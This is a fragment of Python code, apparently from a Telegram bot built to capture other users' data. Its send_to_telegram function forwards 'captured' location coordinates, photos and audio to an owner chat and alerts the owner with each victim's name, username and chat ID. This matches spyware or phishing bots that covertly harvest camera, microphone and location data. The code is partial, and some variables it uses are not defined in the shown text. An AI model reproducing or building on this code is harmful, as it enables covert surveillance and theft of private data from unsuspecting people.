...
# Owner chat ID – jisko bhi notification bhejni hai
...
def get_user_info(chat_id):
    """Fetch username and first name for a chat_id"""
    try:
...
def send_to_telegram(chat_id, data_type, content):
    ...
    # ---- NOTIFY OWNER (if owner is set and chat_id is NOT owner) ----
    if OWNER_CHAT_ID and chat_id != OWNER_CHAT_ID:
        username, first_name = get_user_info(chat_id)
        owner_msg = f"🔔 <b>New data captured</b>\n\n"
        owner_msg += f"👤 User: {first_name} (@{username})\n"
        owner_msg += f"🆔 Chat ID: <code>{chat_id}</code>\n"
        owner_msg += f"📂 Type: {data_type.upper()}\n"
        if data_type == "location":
            owner_msg += f"📍 Lat: {lat}, Lon: {lon}\nAccuracy: {acc}m"
        elif data_type == "photo":
            owner_msg += f"📷 Photo captured (size: {len(content)} chars)"
        elif data_type == "audio":
            owner_msg += f"🎤 Audio captured (size: {len(content)} chars)"
